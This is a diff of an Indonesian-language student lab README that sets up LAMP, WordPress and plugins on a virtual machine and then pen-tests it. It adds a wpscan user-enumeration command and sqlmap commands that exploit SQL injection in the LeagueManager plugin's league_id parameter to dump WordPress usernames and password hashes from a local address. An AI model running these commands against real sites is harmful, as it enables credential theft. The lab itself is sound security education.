@@ -76,8 +76,11 @@
   1. Gunakan perintah seperti berikut
      >```sudo tasksel install_lamp-server```
   2. Tunggu file didownload
+      ![SS](https://github.com/fandyaditya/PKSJ/blob/master/Tugas%202/Gambar/Install%20LAMP%20dan%20wordpress%20di%20ubuntu/2.png)
   3. Set password untuk user root dari mysql
+      ![SS](https://github.com/fandyaditya/PKSJ/blob/master/Tugas%202/Gambar/Install%20LAMP%20dan%20wordpress%20di%20ubuntu/3.png)
   4. Tunggu instalasi selesai
+      ![SS](https://github.com/fandyaditya/PKSJ/blob/master/Tugas%202/Gambar/Install%20LAMP%20dan%20wordpress%20di%20ubuntu/4.png)
   5. Selesai!!!
     
 ### Instalasi Wordpress
@@ -89,27 +92,62 @@
   >```sudo chown -R www-data:www-data /var/www/html/wordpress///```
   >```sudo chmod -R 775 /var/www/html/wordpress/```
   4. Berikan Port Forwarding Rules ke Vitual Machine agar dapat diakses dari luar
+      ![SS](https://github.com/fandyaditya/PKSJ/blob/master/Tugas%202/Gambar/Install%20LAMP%20dan%20wordpress%20di%20ubuntu/4-wp.png)
   5. Berikan rules firewall di ubuntu server, lalu restart firewall
+      ![SS](https://github.com/fandyaditya/PKSJ/blob/master/Tugas%202/Gambar/Install%20LAMP%20dan%20wordpress%20di%20ubuntu/5-wp.png)
   6. Buka mysql, lalu buat database dengan nama wordpress
+      ![SS](https://github.com/fandyaditya/PKSJ/blob/master/Tugas%202/Gambar/Install%20LAMP%20dan%20wordpress%20di%20ubuntu/6-wp.png)
   7. Buka halaman depan dari Wordpress, lalu akan ada inisialisasi
+      ![SS](https://github.com/fandyaditya/PKSJ/blob/master/Tugas%202/Gambar/Install%20LAMP%20dan%20wordpress%20di%20ubuntu/Screenshot%20(49).png)
   8. Isi konfigurasi database dengan yang telah dibuat sebelumnya
+      ![SS](https://github.com/fandyaditya/PKSJ/blob/master/Tugas%202/Gambar/Install%20LAMP%20dan%20wordpress%20di%20ubuntu/Screenshot%20(50).png)
   9. Set konfigurasi website
+      ![SS](https://github.com/fandyaditya/PKSJ/blob/master/Tugas%202/Gambar/Install%20LAMP%20dan%20wordpress%20di%20ubuntu/Screenshot%20(51).png)
   10. Selesai!!!
 
 ### Instalasi Plugin
    1. Masuk ke menu Plugin -> Add New
+      ![SS](https://github.com/fandyaditya/PKSJ/blob/master/Tugas%202/Gambar/Install%20Video%20Player%20wordpress/Screenshot%20(53).png)
     2. Klik tombol Upload Plugin
+      ![SS](https://github.com/fandyaditya/PKSJ/blob/master/Tugas%202/Gambar/Install%20Video%20Player%20wordpress/Screenshot%20(54).png)
     3. Pilih file plugin, lalu klik Install Now
+      ![SS](https://github.com/fandyaditya/PKSJ/blob/master/Tugas%202/Gambar/Install%20Video%20Player%20wordpress/Screenshot%20(55).png)
+      ![SS](https://github.com/fandyaditya/PKSJ/blob/master/Tugas%202/Gambar/Install%20LeagueManager%20di%20wordpress/Screenshot%20(58).png)
     4. Tunggu instalasi selesai
+      ![SS](https://github.com/fandyaditya/PKSJ/blob/master/Tugas%202/Gambar/Install%20LeagueManager%20di%20wordpress/Screenshot%20(59).png)
     5. Selesai!!!
+      ![SS](https://github.com/fandyaditya/PKSJ/blob/master/Tugas%202/Gambar/Install%20Video%20Player%20wordpress/Screenshot%20(57).png)
+      ![SS](https://github.com/fandyaditya/PKSJ/blob/master/Tugas%202/Gambar/Install%20LeagueManager%20di%20wordpress/Screenshot%20(60).png)
  
 ### Uji Penetrasi
    * #### WPScan
-      Lakukan tes dengan cara berikut
+    1. Lakukan tes dengan cara berikut
     > ```wpscan --url http://192.168.1.1 --enumerate -u```
-    
+    2. Jika berhasil akan menampilkan informasi kelemahan plugin
+      ![SS](https://github.com/fandyaditya/PKSJ/blob/master/Tugas%202/Gambar/wpscan%20dan%20sqlmap/2.png)
+    3. Tambahkan data pada LeagueManager pada panel adming di wordpress
+      ![SS](https://github.com/fandyaditya/PKSJ/blob/master/Tugas%202/Gambar/wpscan%20dan%20sqlmap/3.png)
    * sqlmap
-    > ```oeeoaeoaeoaeaoeo```
+    1. Lakukan command di bawah terlebih dahulu untuk mengetahui informasi database
+    > ```sqlmap --url="192.168.1.1/wordpress/?season=2017&league_id=1" -p league_id --dbs```
+      ![SS](https://github.com/fandyaditya/PKSJ/blob/master/Tugas%202/Gambar/wpscan%20dan%20sqlmap/1-sinj.png)
+      ![SS](https://github.com/fandyaditya/PKSJ/blob/master/Tugas%202/Gambar/wpscan%20dan%20sqlmap/2-sinj.png)
+    2. Dapatkan informasi tabel dengan command dibawah ini
+    > ```sqlmap --url="192.168.1.1/wordpress/?season=2017&league_id=1" -D wordpress --tables```
+      ![SS](https://github.com/fandyaditya/PKSJ/blob/master/Tugas%202/Gambar/wpscan%20dan%20sqlmap/3-sinj.png)
+    3. Dapatkan informasi kolom pada tabel dengan command dibawah ini
+    > ```sqlmap --url="192.168.1.1/wordpress/?season=2017&league_id=1" -T wp_users --columns
+      ![SS](https://github.com/fandyaditya/PKSJ/blob/master/Tugas%202/Gambar/wpscan%20dan%20sqlmap/4-sinj.png)
+    4. Dapatkan informasi user dan password dengan command dibawah ini
+    > ```sqlmap --url="192.168.1.1/wordpress/?season=2017&league_id=1" -T wp_users -C user_login,user_pass --dump
+      ![SS](https://github.com/fandyaditya/PKSJ/blob/master/Tugas%202/Gambar/wpscan%20dan%20sqlmap/5-sinj.png)
+      ![SS](https://github.com/fandyaditya/PKSJ/blob/master/Tugas%202/Gambar/wpscan%20dan%20sqlmap/6-sinj.png)
+  
+  
+
+
+
+
 
 ### Kesimpulan dan Saran
    Serangan SQL Injection adalah memodifikasi perintah sql dari aplikasi client dengan cara menyisipkan kedalamnya. Dalam hal ini terdapat plugin dari wordpress yang tidak di optimasi querynya, sehingga rentan SQL Injection tersebut. Dengan tools tools tersebut, developer dapat memeriksa keamanan dari plugin dan seisi websitenya, sehingga developer dapat memperbaharui plugin atau mengganti plugin yang tidak aman.
